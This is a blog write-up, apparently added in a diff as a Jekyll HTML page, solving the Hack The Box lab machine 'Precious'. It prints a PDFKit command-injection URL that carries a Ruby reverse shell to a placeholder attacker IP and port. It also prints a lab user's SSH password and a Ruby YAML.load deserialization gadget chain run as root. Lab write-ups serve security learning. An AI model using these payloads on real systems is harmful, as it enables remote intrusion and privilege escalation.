@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Hack The Box - Precious - Easy Machine</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="shortcut icon" type="image/png" href="/assets/favicon.png">
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box - Precious - Easy Machine | OFenomeno</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Hack The Box - Precious - Easy Machine" />
+<meta name="author" content="OFenomeno" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:8000/HackTheBox-Precious-Easy" />
+<meta property="og:url" content="http://localhost:8000/HackTheBox-Precious-Easy" />
+<meta property="og:site_name" content="OFenomeno" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-01-21T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box - Precious - Easy Machine" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"OFenomeno","url":"ofenomeno.xyz"},"dateModified":"2023-01-21T00:00:00+01:00","datePublished":"2023-01-21T00:00:00+01:00","description":"Introduction","headline":"Hack The Box - Precious - Easy Machine","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/HackTheBox-Precious-Easy"},"url":"http://localhost:8000/HackTheBox-Precious-Easy"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>root@ofenomeno:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/posts"><h2 class="header-link">Posts</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Hack The Box - Precious - Easy Machine</h2>
+  <time datetime="2023-01-21T00:00:00+01:00" class="by-line">21 Jan 2023</time>
+  <h1 id="introduction"><a href="#Introduction"></a>Introduction</h1>
+
+<p><strong>Precious</strong> is an easy-level Linux machine on Hack The Box. It has been more than 50 days since its release, it’s not the most recent machine but it’s an interesting one in my opinion.</p>
+
+<p>My work environment for hacking this machine:</p>
+<ul>
+  <li>Ubuntu 20.04 LTS with some hacking tools installed</li>
+  <li>An <a href="https://github.com/ThePorgs/Exegol">Exegol</a> instance</li>
+</ul>
+
+<h2 id="user-flag"><a href="#User-Flag"></a>User flag</h2>
+
+<h3 id="nmap-scan">Nmap scan</h3>
+
+<p><img src="/assets/precious/precious_nmap.png" alt="" /></p>
+
+<p>I can identify two open ports: the http port (80) and the ssh port (22). If I look at the website hosted on precious.htb, I see the following content:</p>
+
+<p><img src="/assets/precious/website.png" alt="" /></p>
+
+<p>It seems to be a website which converts web pages to PDF format. Moreover, by checking the HTTP response header, I’ve obtained an idea of the used technologies: <strong>Ruby</strong> as programming language and <strong>Nginx</strong> + <strong>Phusion Passenger</strong> as server infrastructure.</p>
+
+<p><img src="/assets/precious/http_headers.png" alt="" /></p>
+
+<p>So, after directory enumeration with Dirbuster and a scan with Nikto without success, I’ve looked for PDF conversion of web pages in Ruby, and I’ve found this article: <a href="https://dev.to/ayushn21/converting-html-to-pdf-using-rails-54e7">Link</a></p>
+
+<p>According to this article, there are two options with Ruby on Rails to convert web pages to PDF:</p>
+<ul>
+  <li>PDFKit</li>
+  <li>WickedPDF</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A couple of popular gems to convert HTML to PDF in Rails are PDFKit and WickedPDF. 
+They both use a command line utility called wkhtmltopdf under the hood; which uses WebKit to render a PDF from HTML. 
+</code></pre></div></div>
+
+<p>After a brief search, I’ve identified the disponibility of an exploit for command injection in PDFKit (CVE-2022-25765), with this <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">link</a>.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PDFKit</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"http://example.com/?name=</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">).</span><span class="nf">to_pdf</span> 
+</code></pre></div></div>
+<p>I can inject a reverse shell with the following payload in the <strong><em>url</em></strong> :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://precious.htb/?url=#{'%20`ruby -rsocket -e'exit if fork;c=TCPSocket.new("YOUR_IP","YOUR_PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`'} 
+</code></pre></div></div>
+
+<p>And… SUCCESS!!
+I have the reverse shell and it was pretty easy!</p>
+
+<p><img src="/assets/precious/reverse_shell.png" alt="" /></p>
+
+<p>In the config files we have nothing interesting:</p>
+
+<p><img src="/assets/precious/web_folder.png" alt="" /></p>
+
+<p>Let’s take a look to /home directory for user flag:</p>
+
+<p><img src="/assets/precious/ssh_creds_henry.png" alt="" /></p>
+
+<p>The user.txt file is in <strong>/home/henry</strong> but I’m logged as <strong>ruby</strong>, so I don’t have the permission to read user.txt file. However, there is an interesting thing in <strong>/home/ruby/.bundle/config</strong> file, it seems to be Henry’s ssh credentials.</p>
+
+<p><strong>henry</strong>:<strong>Q3c1AqGHtoI0aXAYFH</strong></p>
+
+<p>And yes, actually, it’s Henry’s ssh credentials! I can read the user flag now:</p>
+
+<p><img src="/assets/precious/user_flag.png" alt="" /></p>
+
+<hr />
+
+<h2 id="-root-flag"><a href="#Root-Flag"></a> Root flag</h2>
+
+<p>Let’s check the privesc vectors in order to get the root flag in <strong>/root/root.txt</strong>.</p>
+
+<p><img src="/assets/precious/sudo_l.png" alt="" /></p>
+
+<p>With <strong>sudo -l</strong> I can affirm that Henry can execute the <strong>update_dependencies.rb</strong> file as super user with the following command <strong>sudo /usr/bin/ruby /opt/update_dependencies.rb</strong>, and after checking this file, I’ve found an injection point.</p>
+
+<p><strong><em>update_dependencies.rb</em></strong></p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Compare installed dependencies with those specified in "dependencies.yml"</span>
+<span class="nb">require</span> <span class="s2">"yaml"</span>
+<span class="nb">require</span> <span class="s1">'rubygems'</span>
+
+<span class="c1"># TODO: update versions automatically</span>
+<span class="k">def</span> <span class="nf">update_gems</span><span class="p">()</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_from_file</span>
+    <span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.yml"</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_local_gems</span>
+    <span class="no">Gem</span><span class="o">::</span><span class="no">Specification</span><span class="p">.</span><span class="nf">sort_by</span><span class="p">{</span> <span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">.</span><span class="nf">downcase</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">]</span> <span class="p">}.</span><span class="nf">map</span><span class="p">{</span><span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">.</span><span class="nf">to_s</span><span class="p">]}</span>
+<span class="k">end</span>
+
+<span class="n">gems_file</span> <span class="o">=</span> <span class="n">list_from_file</span>
+<span class="n">gems_local</span> <span class="o">=</span> <span class="n">list_local_gems</span>
+
+<span class="n">gems_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">file_name</span><span class="p">,</span> <span class="n">file_version</span><span class="o">|</span>
+    <span class="n">gems_local</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">local_name</span><span class="p">,</span> <span class="n">local_version</span><span class="o">|</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">file_name</span> <span class="o">==</span> <span class="n">local_name</span><span class="p">)</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">file_version</span> <span class="o">!=</span> <span class="n">local_version</span><span class="p">)</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version differs from the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">else</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version is equals to the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">end</span>
+        <span class="k">end</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+
+</code></pre></div></div>
+
+<p><strong><em>Injection point</em></strong></p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.ml"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>But what can I write into dependencies.ml for being able to read the root flag?</p>
+
+<p>After some searchs, I’ve found that YAML.load() function is vulnerable to code injection due to inescrure deserialization, and that there is a payload to exploit this vulnerability in the famous <strong>PayloadAllTheThings</strong> GitHub repo (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">Link</a>).</p>
+
+<p>For being able to execute commands as root, I’ve written this piece of yaml code in a file named dependencies.ml:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::Installer</span>
+    <span class="na">i</span><span class="pi">:</span> <span class="s">x</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::SpecFetcher</span>
+    <span class="na">i</span><span class="pi">:</span> <span class="s">y</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::Requirement</span>
+  <span class="na">requirements</span><span class="pi">:</span>
+    <span class="kt">!ruby/object:Gem::Package::TarReader</span>
+    <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::BufferedIO</span>
+      <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::Package::TarReader::Entry</span>
+         <span class="na">read</span><span class="pi">:</span> <span class="m">0</span>
+         <span class="na">header</span><span class="pi">:</span> <span class="s2">"</span><span class="s">abc"</span>
+      <span class="na">debug_output</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+         <span class="na">socket</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::RequestSet</span>
+             <span class="na">sets</span><span class="pi">:</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+                 <span class="na">socket</span><span class="pi">:</span> <span class="kt">!ruby/module</span> <span class="s1">'</span><span class="s">Kernel'</span>
+                 <span class="na">method_id</span><span class="pi">:</span> <span class="s">:system</span>
+             <span class="na">git_set</span><span class="pi">:</span> <span class="s">cat /root/root.txt</span>
+         <span class="na">method_id</span><span class="pi">:</span> <span class="s">:resolve</span>
+</code></pre></div></div>
+<p>The <strong><em>git_set</em></strong> parameter is the command that we want to execute, and thanks to this payload we can finally get the root flag!</p>
+
+<p><img src="/assets/precious/root_flag.png" alt="" /></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>OFenomeno</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+
+
+  
+</body>
+
+</html>
